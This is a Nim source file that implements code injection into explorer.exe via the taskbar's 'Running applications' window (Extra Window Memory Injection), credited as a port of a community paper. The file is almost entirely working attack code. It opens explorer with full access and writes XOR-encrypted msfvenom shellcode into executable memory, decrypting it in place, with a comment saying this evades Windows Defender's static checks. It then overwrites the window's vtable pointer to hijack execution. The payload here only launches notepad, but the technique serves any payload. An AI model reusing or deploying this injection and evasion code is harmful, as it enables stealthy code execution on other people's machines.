#[
    Author: Furkan Ayar, Twitter: @frknayar
    License: BSD 3-Clause

    This is NIM implementation of Extra Window Memory Injection via "Running applications" property of TaskBar
    References:
        - https://github.com/AXI4L/Community-Papers/blob/master/Code%20Injection%20using%20Taskbar/src.cpp
]#

import winim
import strformat
import std_vector

proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

proc GetProcessByName(process_name: string): DWORD =
    var
        pid: DWORD = 0
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == process_name:
                pid = entry.th32ProcessID
                break

    return pid

# Type definitions
type
    HANDLE* = int
    HWND* = HANDLE
    UINT* = int32
    LPWSTR = ptr WCHAR
    CImpWndProc = object
        pfnAddRef, pfnRelease, pfnWndProc: int

var g_hwndMSTaskListWClass: HWND

proc EnumProc(hWnd: HWND, lP: LPARAM): BOOL =
    var szClass = newWideCString("",127) 
    GetWindowText(hWnd, cast[LPWSTR](szClass), 127)
    if szClass == L"Running applications":
        g_hwndMSTaskListWClass = hWnd

    return TRUE

when isMainModule:

    # Payload dependent constants
    const PAYLOADSIZE: SIZE_T = 319
    const XOR_KEY: byte = 0x08

    # Definition of variables
    var
        hwP: HWND
        hwC: HWND
        hwShellTray: HWND
        dwPid: DWORD = 0
        bytesRoW: SIZE_T
        m_windowPtr: LONG_PTR
        vMem: uint64
        vTableMem: uint64
        m_vTable: CImpWndProc
        ptrVTable: uint64
        shellcodeAddr: uint64

    # Getting process pid from name
    dwPid = GetProcessByName("explorer.exe")

    hwShellTray = FindWindowEx(hwP, hwC, L"Shell_TrayWnd", NULL)
    echo fmt"[<] ShellTrayWnd: 0x{hwShellTray.toHex}"
    EnumChildWindows(hwShellTray, cast[WNDENUMPROC](EnumProc), cast[LPARAM](NULL))
    echo fmt"[*] Running applications: 0x{g_hwndMSTaskListWClass.toHex}"
    GetWindowThreadProcessId(g_hwndMSTaskListWClass, addr dwPid)
    echo fmt"[*] Process: explorer.exe Id: {dwPid}"
    let hProcess: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)
    echo fmt"[*] Handle: 0x{hProcess.toHex}"
    m_windowPtr = GetWindowLongPtr(g_hwndMSTaskListWClass, 0)
    echo fmt"[*] VTable Ptr Ptr: 0x{m_windowPtr.toHex}"

    ReadProcessMemory(hProcess, cast[PVOID](m_windowPtr), addr ptrVTable, cast[SIZE_T](sizeof(ptrVTable)), addr bytesRoW)
    echo fmt"[*] VTable Ptr: 0x{ptrVTable.toHex}"
    ReadProcessMemory(hProcess, cast[PVOID](ptrVTable), addr m_vTable, cast[SIZE_T](sizeof(m_vTable)), addr bytesRoW)
    echo fmt"[*] [CImpWndProc.AddRef] -> 0x{m_vTable.pfnAddRef.toHex}"
    echo fmt"[*] [CImpWndProc.Release] -> 0x{m_vTable.pfnRelease.toHex}"
    echo fmt"[*] [CImpWndProc.WndProc] -> 0x{m_vTable.pfnWndProc.toHex}"

    # msfvenom -a x64 -p windows/x64/exec CMD=notepad.exe EXITFUNC=thread
    # Payload is encrypted with XOR 
    var payload: array[319, byte] = [
        byte 0x40,0x39,0xc1,0x40,0x89,0xe1,0xd5,0xf7,0xf7,0xf7,0x40,0x85,0x0d,0xe7,
        0xf7,0xf7,0xf7,0x40,0xb3,0x84,0xee,0xf6,0x61,0xbf,0x6b,0xb6,0x68,0x40,0x39,
        0x50,0x2f,0x40,0x25,0xf0,0xf7,0xf7,0xf7,0xea,0xfc,0x78,0xa6,0x75,0x85,0x4f,
        0x83,0x76,0x68,0x84,0xee,0xb7,0x30,0xfe,0x3b,0xe4,0x39,0xd2,0xa6,0xc7,0xb3,
        0xda,0x23,0x3d,0x3a,0xe4,0xa6,0x7d,0x33,0xa7,0x23,0x3d,0x3a,0xa4,0xa6,0x7d,
        0x13,0xef,0x23,0xb9,0xdf,0xce,0xa4,0xbb,0x50,0x76,0x23,0x87,0xa8,0x28,0xd2,
        0x97,0x1d,0xbd,0x47,0x96,0x29,0x45,0x27,0xfb,0x20,0xbe,0xaa,0x54,0x85,0xd6,
        0xaf,0xa7,0x29,0x34,0x39,0x96,0xe3,0xc6,0xd2,0xbe,0x60,0x6f,0xe0,0x36,0xe0,
        0x84,0xee,0xf6,0x29,0x3a,0xab,0xc2,0x0f,0xcc,0xef,0x26,0x31,0x34,0x23,0xae,
        0x2c,0x0f,0xae,0xd6,0x28,0xbe,0xbb,0x55,0x3e,0xcc,0x11,0x3f,0x20,0x34,0x5f,
        0x3e,0x20,0x85,0x38,0xbb,0x50,0x76,0x23,0x87,0xa8,0x28,0xaf,0x37,0xa8,0xb2,
        0x2a,0xb7,0xa9,0xbc,0x0e,0x83,0x90,0xf3,0x68,0xfa,0x4c,0x8c,0xab,0xcf,0xb0,
        0xca,0xb3,0xee,0x2c,0x0f,0xae,0xd2,0x28,0xbe,0xbb,0xd0,0x29,0x0f,0xe2,0xbe,
        0x25,0x34,0x2b,0xaa,0x21,0x85,0x3e,0xb7,0xea,0xbb,0xe3,0xfe,0x69,0x54,0xaf,
        0xae,0x20,0xe7,0x35,0xef,0x32,0xc5,0xb6,0xb7,0x38,0xfe,0x31,0xfe,0xeb,0x68,
        0xce,0xb7,0x33,0x40,0x8b,0xee,0x29,0xdd,0xb4,0xbe,0xea,0xad,0x82,0xe1,0x97,
        0x7b,0x11,0xab,0x29,0x05,0x6a,0xb6,0x68,0x84,0xee,0xf6,0x61,0xbf,0x23,0x3b,
        0xe5,0x85,0xef,0xf6,0x61,0xfe,0xd1,0x87,0xe3,0xeb,0x69,0x09,0xb4,0x04,0x8b,
        0xab,0x42,0x8e,0xaf,0x4c,0xc7,0x2a,0xd6,0x2b,0x97,0x51,0xa6,0x75,0xa5,0x97,
        0x57,0xb0,0x14,0x8e,0x6e,0x0d,0x81,0xca,0x6e,0x0d,0x2f,0x97,0x9c,0x99,0x0b,
        0xbf,0x32,0xf7,0xe1,0x5e,0x11,0x23,0x0f,0xd0,0x1f,0xd3,0x18,0xe5,0x8a,0xd8,
        0x04,0xc7,0x0e,0xb6,0x68]

    # Allocating new memory for the new vTable
    vTableMem = cast[uint64](VirtualAllocEx(hProcess, NULL, 32, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE))
    echo fmt"[*] New VTable: 0x{vTableMem.toHex}"

    # Writing payload into memory within a small trick in order to evade static checks of Windows Defender
    vMem = cast[uint64](VirtualAllocEx(hProcess, NULL, 4096, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE))
    WriteProcessMemory(hProcess, cast[PVOID](vMem), unsafeAddr payload, PAYLOADSIZE, addr bytesRoW)
    for i in 0..(PAYLOADSIZE-1):
        var sc: char
        ReadProcessMemory(hProcess, cast[PVOID](vMem+cast[uint64](i*(sizeof(char)))), addr sc, (cast[SIZE_T](sizeof(char))), addr bytesRoW)
        sc = cast[char](cast[byte](sc) xor XOR_KEY)
        WriteProcessMemory(hProcess, cast[PVOID](vMem+cast[uint64](i*(sizeof(char)))), addr sc, (cast[SIZE_T](sizeof(char))), addr bytesRoW)
    echo fmt"[*] Payload Addr: 0x{vMem.toHex}"

    # Building shellcode to trigger the payload
    var shellcode = initVector[uint8]()
    shellcode.add(cast[uint8](0x48))
    shellcode.add(cast[uint8](0xb8))
    for i in 0..7:
        shellcode.add(cast[uint8](vMem shr cast[uint64](cast[uint8](i * 8) and cast[uint8](0xff))))
    shellcode.add(cast[uint8](0xff))
    shellcode.add(cast[uint8](0xd0))
    shellcode.add(cast[uint8](0x48))
    shellcode.add(cast[uint8](0xb8))
    for i in 0..7:
        shellcode.add(cast[uint8](m_vTable.pfnRelease shr cast[uint64](cast[uint8](i * 8) and cast[uint8](0xff))))
    shellcode.add(cast[uint8](0xff))
    shellcode.add(cast[uint8](0xe0))

    # Setting shellcode location at the end of payload
    shellcodeAddr = vMem + cast[uint64](PAYLOADSIZE) + cast[uint64](15) and cast[uint64](-16)
    m_vTable.pfnRelease = cast[int](shellcodeAddr)
    echo fmt"[*] Shellcode Addr: 0x{shellcodeAddr.toHex}"

    # Planting shellcode into memory
    for i in shellcode.toSeq:
        WriteProcessMemory(hProcess, cast[PVOID](shellcodeAddr), unsafeAddr i, cast[SIZE_T](sizeof(i)), addr bytesRoW)
        shellcodeAddr = shellcodeAddr + cast[uint64](cast[SIZE_T](sizeof(i)))

    WriteProcessMemory(hProcess, cast[PVOID](vTableMem), addr m_vTable, cast[SIZE_T](sizeof(m_vTable)), addr bytesRoW)
    # Overwriting the window memory in order to trigger shellcode
    WriteProcessMemory(hProcess, cast[PVOID](m_windowPtr), addr vTableMem, cast[SIZE_T](sizeof(vTableMem)), addr bytesRoW)
    CloseHandle(hProcess)
    echo fmt"[*] Done, Exiting.."
    quit(QuitSuccess)
